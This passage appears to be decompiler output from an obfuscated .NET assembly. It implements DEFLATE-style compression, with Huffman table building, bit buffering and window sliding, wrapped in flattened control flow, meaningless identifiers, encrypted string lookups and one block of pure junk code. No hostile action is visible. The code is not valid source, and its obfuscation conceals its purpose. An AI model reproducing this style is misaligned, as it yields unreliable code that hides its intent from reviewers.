          for (index1 = num5; index1 > 0 && (int) obj0.\u0001[numArray1[index2 = (index1 - 1) / 2]] > *(int*) ((IntPtr) voidPtr + 8); index1 = index2)
            numArray1[index1] = numArray1[index2];
          numArray1[index1] = *(int*) ((IntPtr) voidPtr + 4);
          num3 = *(int*) ((IntPtr) voidPtr + 4);
label_7:
          *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) + 1;
          continue;
label_14:
          int num6;
          int num7;
          while (true)
          {
            int num8;
            int num9;
            int num10;
            if (num1 < 2)
            {
              num8 = num3;
              num9 = 2;
              if (num9 != 0)
              {
                if (num8 < num9)
                {
                  num10 = ++num3;
                  goto label_13;
                }
              }
              else
                goto label_17;
            }
            else
              goto label_15;
label_11:
            num10 = 0;
label_13:
            int num11 = num10;
            numArray1[num1++] = num11;
            continue;
label_15:
            obj0.\u0002 = Math.Max(num3 + 1, obj0.\u0001);
            *(int*) ((IntPtr) voidPtr + 12) = num1;
            num6 = 4;
            num7 = num1;
            if (true)
            {
              numArray2 = new int[num6 * num7 - 2];
              num9 = num1;
              num8 = 2;
            }
            else
              break;
label_17:
            int[] numArray3 = new int[num8 * num9 - 1];
            int num12 = *(int*) ((IntPtr) voidPtr + 12);
            *(int*) ((IntPtr) voidPtr + 16) = 0;
            while (*(int*) ((IntPtr) voidPtr + 16) < num1)
            {
              if (true)
              {
                *(int*) ((IntPtr) voidPtr + 20) = numArray1[*(int*) ((IntPtr) voidPtr + 16)];
                numArray2[2 * *(int*) ((IntPtr) voidPtr + 16)] = *(int*) ((IntPtr) voidPtr + 20);
                numArray2[2 * *(int*) ((IntPtr) voidPtr + 16) + 1] = -1;
                numArray3[*(int*) ((IntPtr) voidPtr + 16)] = (int) obj0.\u0001[*(int*) ((IntPtr) voidPtr + 20)] << 8;
                numArray1[*(int*) ((IntPtr) voidPtr + 16)] = *(int*) ((IntPtr) voidPtr + 16);
                *(int*) ((IntPtr) voidPtr + 16) = *(int*) ((IntPtr) voidPtr + 16) + 1;
              }
              else
                goto label_11;
            }
            int num13;
            do
            {
              *(int*) ((IntPtr) voidPtr + 24) = numArray1[0];
              int index3 = numArray1[--num1];
              int index4 = 0;
              int index5 = 1;
              int num14;
              int num15;
              while (true)
              {
                if (index5 < num1)
                {
                  if (index5 + 1 < num1 && numArray3[numArray1[index5]] > numArray3[numArray1[index5 + 1]])
                    ++index5;
                  numArray1[index4] = numArray1[index5];
                  index4 = index5;
                  num13 = index5;
                  if (true)
                  {
                    num14 = num13 * 2;
                    num15 = 1;
                    if (num15 != 0)
                      index5 = num14 + num15;
                    else
                      goto label_45;
                  }
                  else
                    goto label_1;
                }
                else
                  break;
              }
              int num16 = numArray3[index3];
              while (true)
              {
                int num17;
                int index6 = num17 = index4;
                while (true)
                {
                  if (num17 <= 0 || numArray3[numArray1[index4 = (index6 - 1) / 2]] <= num16)
                  {
                    numArray1[index6] = index3;
                    *(int*) ((IntPtr) voidPtr + 28) = numArray1[0];
                    index3 = num12++;
                    numArray2[2 * index3] = *(int*) ((IntPtr) voidPtr + 24);
                    numArray2[2 * index3 + 1] = *(int*) ((IntPtr) voidPtr + 28);
                    *(int*) ((IntPtr) voidPtr + 32) = Math.Min(numArray3[*(int*) ((IntPtr) voidPtr + 24)] & (int) byte.MaxValue, numArray3[*(int*) ((IntPtr) voidPtr + 28)] & (int) byte.MaxValue);
                    numArray3[index3] = num16 = numArray3[*(int*) ((IntPtr) voidPtr + 24)] + numArray3[*(int*) ((IntPtr) voidPtr + 28)] - *(int*) ((IntPtr) voidPtr + 32) + 1;
                    if (true)
                      index4 = 0;
                    index6 = 1;
                    int num18;
                    while (true)
                    {
                      if (true)
                      {
                        num4 = index6;
                        if (true)
                        {
                          int num19 = num1;
                          if (num4 < num19)
                          {
                            if (index6 + 1 < num1 && numArray3[numArray1[index6]] > numArray3[numArray1[index6 + 1]])
                            {
                              num18 = index6 + 1;
                              if (true)
                                index6 = num18;
                              else
                                break;
                            }
                            numArray1[index4] = numArray1[index6];
                            index4 = index6;
                            index6 = index4 * 2 + 1;
                          }
                          else
                            goto label_43;
                        }
                        else
                          goto label_51;
                      }
                      else
                        goto label_15;
                    }
                    num17 = num18;
                  }
                  else
                    break;
                }
                numArray1[index6] = numArray1[index4];
              }
label_43:
              if ((index5 = index4) > 0)
              {
                int num20 = numArray3[numArray1[index4 = (index5 - 1) / 2]];
                num15 = num16;
                num14 = num20;
              }
              else
                goto label_46;
label_45:
              if (num14 > num15)
              {
                numArray1[index5] = numArray1[index4];
                goto label_43;
              }
label_46:
              numArray1[index5] = index3;
            }
            while (num1 > 1);
            goto label_47;
label_1:
            num10 = num13;
            goto label_13;
          }
          num5 = num7;
          num5 = num6;
          goto label_3;
label_49:
          *(int*) ((IntPtr) voidPtr + 8) = (int) obj0.\u0001[*(int*) ((IntPtr) voidPtr + 4)];
          if (*(int*) ((IntPtr) voidPtr + 8) != 0)
          {
            num5 = num1;
            goto label_3;
          }
          else
            goto label_7;
        }
label_51:
        num2 = num4;
      }
label_47:
      \u0004.\u0001(numArray2, obj0);
    }

    static void \u0001([In] \u0004.\u0002 obj0)
    {
      obj0.\u0001 >>= obj0.\u0003 & 7;
      obj0.\u0003 &= -8;
    }

    static unsafe void \u0001([In] \u0004.\u0008 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(16);
      Array.Copy((Array) obj0.\u0001, 32768, (Array) obj0.\u0001, 0, 32768);
      obj0.\u0011 -= 32768;
      obj0.\u0014 -= 32768;
      obj0.\u0013 -= 32768;
      *(int*) voidPtr = 0;
      while (*(int*) voidPtr < 32768)
      {
        *(int*) ((IntPtr) voidPtr + 4) = (int) obj0.\u0001[*(int*) voidPtr] & (int) ushort.MaxValue;
        obj0.\u0001[*(int*) voidPtr] = *(int*) ((IntPtr) voidPtr + 4) >= 32768 ? (short) (*(int*) ((IntPtr) voidPtr + 4) - 32768) : (short) 0;
        *(int*) voidPtr = *(int*) voidPtr + 1;
      }
      *(int*) ((IntPtr) voidPtr + 8) = 0;
      while (*(int*) ((IntPtr) voidPtr + 8) < 32768)
      {
        *(int*) ((IntPtr) voidPtr + 12) = (int) obj0.\u0002[*(int*) ((IntPtr) voidPtr + 8)] & (int) ushort.MaxValue;
        obj0.\u0002[*(int*) ((IntPtr) voidPtr + 8)] = *(int*) ((IntPtr) voidPtr + 12) >= 32768 ? (short) (*(int*) ((IntPtr) voidPtr + 12) - 32768) : (short) 0;
        *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + 1;
      }
    }

    static void \u0001(\u0004.\u0002 _param0, [In] int obj1)
    {
label_0:
      _param0.\u0001 >>= obj1;
      do
      {
        if (true)
          _param0.\u0003 -= obj1;
        else
          goto label_0;
      }
      while (false);
    }

    static \u0004.\u0004 \u0001([In] \u0004.\u0005 obj0)
    {
      byte[] numArray = new byte[obj0.\u0008];
      Array.Copy((Array) obj0.\u0002, 0, (Array) numArray, 0, obj0.\u0008);
      return new \u0004.\u0004(numArray);
    }

    static void \u0001(short[] _param0, byte[] _param1, [In] \u0004.\u0007.\u0001 obj2)
    {
      obj2.\u0002 = _param0;
      obj2.\u0001 = _param1;
    }

    static void \u0001([In] \u0004.\u0007 obj0)
    {
      obj0.\u000E = 0;
      obj0.\u000F = 0;
    }

    static unsafe void \u0001(int[] _param0, [In] \u0004.\u0007.\u0001 obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(36);
      obj1.\u0001 = new byte[obj1.\u0001.Length];
      *(int*) voidPtr = _param0.Length / 2;
      *(int*) ((IntPtr) voidPtr + 4) = (*(int*) voidPtr + 1) / 2;
      *(int*) ((IntPtr) voidPtr + 8) = 0;
      *(int*) ((IntPtr) voidPtr + 12) = 0;
      while (true)
      {
        if (*(int*) ((IntPtr) voidPtr + 12) < obj1.\u0003)
          obj1.\u0001[*(int*) ((IntPtr) voidPtr + 12)] = 0;
        else
          goto label_6;
label_4:
        *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + 1;
        continue;
label_6:
        int[] numArray = new int[*(int*) voidPtr];
        numArray[*(int*) voidPtr - 1] = 0;
        *(int*) ((IntPtr) voidPtr + 16) = *(int*) voidPtr - 1;
        while (*(int*) ((IntPtr) voidPtr + 16) >= 0)
        {
          int num1 = _param0[2 * *(int*) ((IntPtr) voidPtr + 16) + 1];
          int num2;
          while (true)
          {
            if (num1 != -1)
            {
              *(int*) ((IntPtr) voidPtr + 20) = numArray[*(int*) ((IntPtr) voidPtr + 16)] + 1;
              num2 = *(int*) ((IntPtr) voidPtr + 20);
              if (false)
                num1 = num2;
              else
                break;
            }
            else
              goto label_14;
          }
          int num3 = obj1.\u0003;
          if (num2 > num3)
          {
            *(int*) ((IntPtr) voidPtr + 20) = obj1.\u0003;
            *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + 1;
          }
          if (true)
          {
            numArray[_param0[2 * *(int*) ((IntPtr) voidPtr + 16)]] = numArray[_param0[2 * *(int*) ((IntPtr) voidPtr + 16) + 1]] = *(int*) ((IntPtr) voidPtr + 20);
            goto label_15;
          }
          else
            goto label_4;
label_14:
          *(int*) ((IntPtr) voidPtr + 24) = numArray[*(int*) ((IntPtr) voidPtr + 16)];
          ++obj1.\u0001[*(int*) ((IntPtr) voidPtr + 24) - 1];
          obj1.\u0001[_param0[2 * *(int*) ((IntPtr) voidPtr + 16)]] = (byte) numArray[*(int*) ((IntPtr) voidPtr + 16)];
label_15:
          *(int*) ((IntPtr) voidPtr + 16) = *(int*) ((IntPtr) voidPtr + 16) - 1;
        }
        break;
      }
      if (*(int*) ((IntPtr) voidPtr + 8) == 0)
        return;
      int index1;
      if (true)
        index1 = obj1.\u0003 - 1;
      else
        goto label_23;
label_21:
      while (obj1.\u0001[--index1] == 0)
        ;
label_22:
      --obj1.\u0001[index1];
label_23:
      int[] numArray1;
      int[] numArray2 = numArray1 = obj1.\u0001;
      int index2;
      index1 = index2 = index1 + 1;
      int index3 = index2;
      int num4 = numArray2[(IntPtr) index3] + 1;
      numArray1[index2] = num4;
      *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) - (1 << obj1.\u0003 - 1 - index1);
      if (*(int*) ((IntPtr) voidPtr + 8) <= 0 || index1 >= obj1.\u0003 - 1)
      {
        if (*(int*) ((IntPtr) voidPtr + 8) <= 0)
        {
          obj1.\u0001[obj1.\u0003 - 1] += *(int*) ((IntPtr) voidPtr + 8);
          obj1.\u0001[obj1.\u0003 - 2] -= *(int*) ((IntPtr) voidPtr + 8);
          int num5 = 2 * *(int*) ((IntPtr) voidPtr + 4);
          *(int*) ((IntPtr) voidPtr + 28) = obj1.\u0003;
          while (*(int*) ((IntPtr) voidPtr + 28) != 0)
          {
            *(int*) ((IntPtr) voidPtr + 32) = obj1.\u0001[*(int*) ((IntPtr) voidPtr + 28) - 1];
            while (*(int*) ((IntPtr) voidPtr + 32) > 0)
            {
              int index4 = 2 * _param0[num5++];
              if (_param0[index4 + 1] == -1)
              {
                obj1.\u0001[_param0[index4]] = (byte) *(int*) ((IntPtr) voidPtr + 28);
                *(int*) ((IntPtr) voidPtr + 32) = *(int*) ((IntPtr) voidPtr + 32) - 1;
              }
            }
            *(int*) ((IntPtr) voidPtr + 28) = *(int*) ((IntPtr) voidPtr + 28) - 1;
          }
        }
        else
          goto label_21;
      }
      else
        goto label_22;
    }

    static void \u0001(int _param0, [In] \u0004.\u000F obj1)
    {
      \u0004.\u0001(obj1, _param0);
      \u0004.\u0001(obj1, _param0 >> 16);
    }

    static void \u0001([In] \u0004.\u000E obj0)
    {
      if (obj0.\u0003 > 0)
        goto label_2;
label_1:
      obj0.\u0001 = 0U;
      obj0.\u0003 = 0;
      return;
label_2:
      byte[] numArray1 = obj0.\u0001;
      \u0004.\u000E obj1 = obj0;
      int num1;
      int num2 = num1 = obj1.\u0002;
      obj1.\u0002 = num1 + 1;
      int index1 = num2;
      int num3 = (int) (byte) obj0.\u0001;
      numArray1[index1] = (byte) num3;
      if (obj0.\u0003 > 8)
      {
        byte[] numArray2 = obj0.\u0001;
        \u0004.\u000E obj2 = obj0;
        int num4;
        int num5 = num4 = obj2.\u0002;
        obj2.\u0002 = num4 + 1;
        int index2 = num5;
        int num6 = (int) (byte) (obj0.\u0001 >> 8);
        numArray2[index2] = (byte) num6;
        goto label_1;
      }
      else
        goto label_1;
    }

    static int \u0001(\u0004.\u0007 _param0, [In] int obj1)
    {
      int num1;
      do
      {
        if (true)
          goto label_10;
label_1:
        continue;
label_10:
        num1 = 0;
        goto label_1;
      }
      while (false);
      int num2;
      while (true)
      {
        int num3 = obj1;
        int num4 = 4;
        int num5;
        int num6;
        while (true)
        {
          if (num3 >= num4)
            goto label_11;
          else
            goto label_13;
label_4:
          num6 = 1;
          int num7;
          num5 = num7;
label_5:
          if (num6 == 0)
          {
            num4 = num6;
            num3 = num5;
            continue;
          }
          break;
label_11:
          num5 = num1;
          num6 = 2;
          if (num6 != 0)
          {
            num1 = num5 + num6;
            num7 = obj1;
            goto label_4;
          }
          else
            goto label_5;
label_13:
          num2 = num1 + obj1;
          if (false)
          {
            num7 = num2;
            goto label_4;
          }
          else
            goto label_9;
        }
        obj1 = num5 >> num6;
      }
label_9:
      return num2;
    }

    static bool \u0001([In] \u0004.\u0007 obj0) => obj0.\u000E >= 16384;

    static int \u0001(\u0004.\u0007 _param0, [In] int obj1)
    {
      int num1 = obj1;
      int num2;
      if (true)
      {
        if (num1 == (int) byte.MaxValue)
          return 285;
        if (true)
        {
          num2 = 257;
          goto label_14;
        }
        else
          goto label_14;
      }
      else
        goto label_13;
label_5:
      int num3;
      if (true)
        num3 >>= 1;
      obj1 = num3;
      goto label_14;
label_13:
      num2 = num1;
      num3 = obj1;
      goto label_5;
label_14:
      int num4 = obj1;
      if (false)
      {
        num3 = num4;
        goto label_5;
      }
      else
      {
        int num5 = 8;
        if (num5 != 0)
        {
          if (num4 >= num5)
          {
            num1 = num2 + 4;
            goto label_13;
          }
          else
          {
            int num6 = num2;
            num5 = obj1;
            num4 = num6;
          }
        }
        return num4 + num5;
      }
    }

    static unsafe void \u0001([In] \u0007.\u0001 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr1 = (void*) __untypedstackalloc(83);
      *(sbyte*) ((IntPtr) voidPtr1 + 82) = (sbyte) 1;
      if (*(sbyte*) ((IntPtr) voidPtr1 + 82) != (sbyte) 0)
        *(int*) ((IntPtr) voidPtr1 + 72) = 1680590156;
      void* voidPtr2;
      while (true)
      {
        *(sbyte*) ((IntPtr) voidPtr1 + 82) = (sbyte) 1;
        if (*(sbyte*) ((IntPtr) voidPtr1 + 82) != (sbyte) 0)
        {
          *(long*) voidPtr1 = 0L;
          try
          {
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            *(sbyte*) ((IntPtr) voidPtr2 + 82) = (sbyte) 0;
            if (*(sbyte*) ((IntPtr) voidPtr2 + 82) != (sbyte) 0)
              *(double*) ((IntPtr) voidPtr2 + 24) = 0.1790893;
            *(double*) ((IntPtr) voidPtr2 + 16) = 263467685.0;
            string str = \u0004.\u000F(8947);
            *(sbyte*) ((IntPtr) voidPtr2 + 82) = (sbyte) 1;
            if (*(sbyte*) ((IntPtr) voidPtr2 + 82) != (sbyte) 0)
              *(double*) ((IntPtr) voidPtr2 + 32) = 0.8146639;
            *(long*) ((IntPtr) voidPtr2 + 8) = 1L;
            *(sbyte*) ((IntPtr) voidPtr2 + 82) = (sbyte) 1;
            if (*(sbyte*) ((IntPtr) voidPtr2 + 82) != (sbyte) 0)
              *(double*) ((IntPtr) voidPtr2 + 40) = 0.2277816;
            ProjectData.ClearProjectError();
          }
        }
        else
          break;
      }
      *(double*) ((IntPtr) voidPtr1 + 48) = 0.6191876;
      while (true)
      {
        double num1 = *(double*) ((IntPtr) voidPtr1 + 48);
        *(double*) ((IntPtr) voidPtr1 + 64) = 0.4898304;
        double num2 = *(double*) ((IntPtr) voidPtr1 + 64);
        if (num1 <= num2)
        {
          *(sbyte*) ((IntPtr) voidPtr1 + 82) = (sbyte) 0;
          if (*(sbyte*) ((IntPtr) voidPtr1 + 82) != (sbyte) 0)
            *(double*) ((IntPtr) voidPtr1 + 56) = 0.3705153;
          try
          {
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            string str = \u0004.\u000F(9105);
            *(int*) ((IntPtr) voidPtr2 + 76) = -796810157;
            ProjectData.ClearProjectError();
          }
          *(sbyte*) ((IntPtr) voidPtr1 + 82) = (sbyte) 1;
          if (*(sbyte*) ((IntPtr) voidPtr1 + 82) != (sbyte) 0)
          {
            *(sbyte*) ((IntPtr) voidPtr1 + 80) = (sbyte) 1;
            try
            {
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              *(sbyte*) ((IntPtr) voidPtr2 + 81) = (sbyte) 0;
              ProjectData.ClearProjectError();
            }
          }
          *(double*) ((IntPtr) voidPtr1 + 48) = *(double*) ((IntPtr) voidPtr1 + 48) + 1.0;
        }
        else
          break;
      }
    }

    static void \u0001(\u0004.\u0008 _param0, [In] byte[] obj1)
    {
      if (true)
        _param0.\u0002 = obj1;
      do
      {
        _param0.\u0017 = 0;
        _param0.\u0018 = obj1.Length;
      }
      while (false);
    }

    static unsafe void \u0001(byte[] _param0, [In] \u0004.\u0004 obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(68);
      int[] numArray1 = new int[16];
      int[] numArray2 = new int[16];
      *(int*) voidPtr = 0;
      while (*(int*) voidPtr < _param0.Length)
      {
        *(int*) ((IntPtr) voidPtr + 4) = (int) _param0[*(int*) voidPtr];
        if (*(int*) ((IntPtr) voidPtr + 4) > 0)
        {
          int[] numArray3;
          int index;
          int num = (numArray3 = numArray1)[(IntPtr) (index = *(int*) ((IntPtr) voidPtr + 4))] + 1;
          numArray3[index] = num;
        }
        *(int*) voidPtr = *(int*) voidPtr + 1;
      }
      *(int*) ((IntPtr) voidPtr + 8) = 0;
      *(int*) ((IntPtr) voidPtr + 12) = 512;
      *(int*) ((IntPtr) voidPtr + 16) = 1;
      while (*(int*) ((IntPtr) voidPtr + 16) <= 15)
      {
        numArray2[*(int*) ((IntPtr) voidPtr + 16)] = *(int*) ((IntPtr) voidPtr + 8);
        *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + (numArray1[*(int*) ((IntPtr) voidPtr + 16)] << 16 - *(int*) ((IntPtr) voidPtr + 16));
        if (*(int*) ((IntPtr) voidPtr + 16) >= 10)
        {
          *(int*) ((IntPtr) voidPtr + 20) = numArray2[*(int*) ((IntPtr) voidPtr + 16)] & 130944;
          *(int*) ((IntPtr) voidPtr + 24) = *(int*) ((IntPtr) voidPtr + 8) & 130944;
          *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + (*(int*) ((IntPtr) voidPtr + 24) - *(int*) ((IntPtr) voidPtr + 20) >> 16 - *(int*) ((IntPtr) voidPtr + 16));
        }
        *(int*) ((IntPtr) voidPtr + 16) = *(int*) ((IntPtr) voidPtr + 16) + 1;
      }
      obj1.\u0001 = new short[*(int*) ((IntPtr) voidPtr + 12)];
      *(int*) ((IntPtr) voidPtr + 28) = 512;
      *(int*) ((IntPtr) voidPtr + 32) = 15;
      if (true)
        goto label_15;
label_12:
      *(int*) ((IntPtr) voidPtr + 28) = *(int*) ((IntPtr) voidPtr + 28) + (1 << *(int*) ((IntPtr) voidPtr + 32) - 9);
      *(int*) ((IntPtr) voidPtr + 44) = *(int*) ((IntPtr) voidPtr + 44) + 128;
label_13:
      if (*(int*) ((IntPtr) voidPtr + 44) < *(int*) ((IntPtr) voidPtr + 36))
      {
        obj1.\u0001[(int) \u0004.\u0001(*(int*) ((IntPtr) voidPtr + 44))] = (short) (-*(int*) ((IntPtr) voidPtr + 28) << 4 | *(int*) ((IntPtr) voidPtr + 32));
        goto label_12;
      }
      else
        *(int*) ((IntPtr) voidPtr + 32) = *(int*) ((IntPtr) voidPtr + 32) - 1;
label_15:
      if (*(int*) ((IntPtr) voidPtr + 32) >= 10)
      {
        *(int*) ((IntPtr) voidPtr + 36) = *(int*) ((IntPtr) voidPtr + 8) & 130944;
        *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) - (numArray1[*(int*) ((IntPtr) voidPtr + 32)] << 16 - *(int*) ((IntPtr) voidPtr + 32));
        *(int*) ((IntPtr) voidPtr + 40) = *(int*) ((IntPtr) voidPtr + 8) & 130944;
        *(int*) ((IntPtr) voidPtr + 44) = *(int*) ((IntPtr) voidPtr + 40);
        goto label_13;
      }
      else
      {
        *(int*) ((IntPtr) voidPtr + 48) = 0;
        while (*(int*) ((IntPtr) voidPtr + 48) < _param0.Length)
        {
          *(int*) ((IntPtr) voidPtr + 52) = (int) _param0[*(int*) ((IntPtr) voidPtr + 48)];
          if (*(int*) ((IntPtr) voidPtr + 52) != 0)
          {
            *(int*) ((IntPtr) voidPtr + 8) = numArray2[*(int*) ((IntPtr) voidPtr + 52)];
            *(int*) ((IntPtr) voidPtr + 56) = (int) \u0004.\u0001(*(int*) ((IntPtr) voidPtr + 8));
            if (*(int*) ((IntPtr) voidPtr + 52) <= 9)
            {
              do
              {
                obj1.\u0001[*(int*) ((IntPtr) voidPtr + 56)] = (short) (*(int*) ((IntPtr) voidPtr + 48) << 4 | *(int*) ((IntPtr) voidPtr + 52));
                *(int*) ((IntPtr) voidPtr + 56) = *(int*) ((IntPtr) voidPtr + 56) + (1 << *(int*) ((IntPtr) voidPtr + 52));
              }
              while (*(int*) ((IntPtr) voidPtr + 56) < 512);
            }
            else
            {
              *(int*) ((IntPtr) voidPtr + 60) = (int) obj1.\u0001[*(int*) ((IntPtr) voidPtr + 56) & 511];
              *(int*) ((IntPtr) voidPtr + 64) = 1 << (*(int*) ((IntPtr) voidPtr + 60) & 15);
              *(int*) ((IntPtr) voidPtr + 60) = -(*(int*) ((IntPtr) voidPtr + 60) >> 4);
              do
              {
                obj1.\u0001[*(int*) ((IntPtr) voidPtr + 60) | *(int*) ((IntPtr) voidPtr + 56) >> 9] = (short) (*(int*) ((IntPtr) voidPtr + 48) << 4 | *(int*) ((IntPtr) voidPtr + 52));
                *(int*) ((IntPtr) voidPtr + 56) = *(int*) ((IntPtr) voidPtr + 56) + (1 << *(int*) ((IntPtr) voidPtr + 52));
              }
              while (*(int*) ((IntPtr) voidPtr + 56) < *(int*) ((IntPtr) voidPtr + 64));
            }
            numArray2[*(int*) ((IntPtr) voidPtr + 52)] = *(int*) ((IntPtr) voidPtr + 8) + (1 << 16 - *(int*) ((IntPtr) voidPtr + 52));
          }
          *(int*) ((IntPtr) voidPtr + 48) = *(int*) ((IntPtr) voidPtr + 48) + 1;
        }
      }
    }

    static bool \u0001(\u0004.\u0007 _param0, [In] int obj1)
    {
      _param0.\u0001[_param0.\u000E] = (short) 0;
      byte[] numArray1 = _param0.\u0002;
      \u0004.\u0007 obj = _param0;
      int num1;
      int num2 = num1 = obj.\u000E;
      obj.\u000E = num1 + 1;
      int index1 = num2;
      int num3 = (int) (byte) obj1;
      numArray1[index1] = (byte) num3;
      short[] numArray2;
      int index2;
      (numArray2 = _param0.\u0001.\u0001)[index2 = obj1] = (short) ((int) numArray2[(IntPtr) index2] + 1);
      return _param0.\u000E >= 16384;
    }

    static void \u0001([In] \u0004.\u0008 obj0) => obj0.\u0010 = (int) obj0.\u0001[obj0.\u0014] << 5 ^ (int) obj0.\u0001[obj0.\u0014 + 1];

    static void \u0001(\u0004.\u000E _param0, [In] int obj1)
    {
      byte[] numArray1 = _param0.\u0001;
      \u0004.\u000E obj2 = _param0;
      int num1;
      int num2 = num1 = obj2.\u0002;
      obj2.\u0002 = num1 + 1;
      int index1 = num2;
      int num3 = (int) (byte) obj1;
      numArray1[index1] = (byte) num3;
      byte[] numArray2 = _param0.\u0001;
      \u0004.\u000E obj3 = _param0;
      int num4;
      int num5 = num4 = obj3.\u0002;
      obj3.\u0002 = num4 + 1;
      int index2 = num5;
      int num6 = (int) (byte) (obj1 >> 8);
      numArray2[index2] = (byte) num6;
    }

    static byte[] \u0001(byte[] _param0) => \u0004.\u0001(1, (byte[]) null, _param0, (byte[]) null);

    static unsafe int \u0001(\u0004.\u0004 _param0, [In] \u0004.\u0002 obj1)
    {
      int num1;
      void* voidPtr;
      if (true)
      {
        int num2 = 16;
        int index;
        int num3;
        while (true)
        {
          // ISSUE: untyped stack allocation
          voidPtr = (void*) __untypedstackalloc(num2);
          if ((index = \u0004.\u0001(obj1, 9)) >= 0)
          {
            if ((num1 = (int) _param0.\u0001[index]) >= 0)
            {
              if (true)
              {
                \u0004.\u0001(obj1, num1 & 15);
                num3 = num1;
                if (false)
                  num2 = num3;
                else
                  break;
              }
              else
                goto label_8;
            }
            else
              goto label_5;
          }
          else
            goto label_13;
        }
        return num3 >> 4;
label_5:
        *(int*) voidPtr = -(num1 >> 4);
        *(int*) ((IntPtr) voidPtr + 4) = num1 & 15;
        int num4;
        if ((num4 = \u0004.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 4))) >= 0)
        {
          int num5 = (int) _param0.\u0001[*(int*) voidPtr | num4 >> 9];
          \u0004.\u0001(obj1, num5 & 15);
          return num5 >> 4;
        }
        *(int*) ((IntPtr) voidPtr + 8) = obj1.\u0003;
        index = \u0004.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 8));
        num1 = (int) _param0.\u0001[*(int*) voidPtr | index >> 9];
label_8:
        if (true)
        {
          if ((num1 & 15) > *(int*) ((IntPtr) voidPtr + 8))
            return -1;
          \u0004.\u0001(obj1, num1 & 15);
          if (true)
            return num1 >> 4;
          goto label_14;
        }
        else
          goto label_16;
label_13:
        *(int*) ((IntPtr) voidPtr + 12) = obj1.\u0003;
        index = \u0004.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 12));
label_14:
        num1 = (int) _param0.\u0001[index];
      }
      if (num1 < 0)
        goto label_18;
label_16:
      if ((num1 & 15) <= *(int*) ((IntPtr) voidPtr + 12))
      {
        \u0004.\u0001(obj1, num1 & 15);
        return num1 >> 4;
      }
label_18:
      return -1;
    }

    static int \u0001(\u0004.\u000E _param0, byte[] _param1, int _param2, [In] int obj3)
    {
      int num1 = _param0.\u0003;
      int num2 = 8;
      int num3;
      int num4;
      while (true)
      {
        if (num1 >= num2)
        {
          byte[] numArray = _param0.\u0001;
          \u0004.\u000E obj = _param0;
          int num5;
          int num6 = num5 = obj.\u0002;
          obj.\u0002 = num5 + 1;
          int index = num6;
          int num7 = (int) (byte) _param0.\u0001;
          numArray[index] = (byte) num7;
          if (true)
          {
            _param0.\u0001 >>= 8;
            _param0.\u0003 -= 8;
          }
          else
            goto label_6;
        }
        if (obj3 > _param0.\u0002 - _param0.\u0001)
        {
          num3 = _param0.\u0002;
          num4 = _param0.\u0001;
          if (false)
          {
            num2 = num4;
            num1 = num3;
          }
          else
            break;
        }
        else
          goto label_5;
      }
      obj3 = num3 - num4;
      Array.Copy((Array) _param0.\u0001, _param0.\u0001, (Array) _param1, _param2, obj3);
      _param0.\u0001 = 0;
      _param0.\u0002 = 0;
      goto label_6;
label_5:
      Array.Copy((Array) _param0.\u0001, _param0.\u0001, (Array) _param1, _param2, obj3);
      _param0.\u0001 += obj3;
label_6:
      return obj3;
    }

    static \u0004() => \u0006.\u0002.\u0001(typeof (\u0004));
  }
}
